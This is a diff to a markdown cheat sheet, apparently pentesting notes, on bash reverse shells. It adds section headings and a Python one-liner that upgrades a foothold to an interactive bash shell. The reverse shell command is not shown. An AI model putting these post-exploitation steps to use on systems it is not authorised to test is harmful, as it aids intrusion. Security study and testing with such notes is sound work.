@@ -1,3 +1,7 @@
+# Bash
+
+## Bash One-Liner Reverse Shell
+
 Bash one-liner to create a reverse interactive shell from the target to your attack machine: 
 - Enter the  following in the target: 
 
@@ -15,3 +19,8 @@ From the Bash manpage:
 
 ---
 
+## Bash Shell via Python
+
+```
+python3 -c 'import pty;pty.spawn("/bin/bash")'
+```
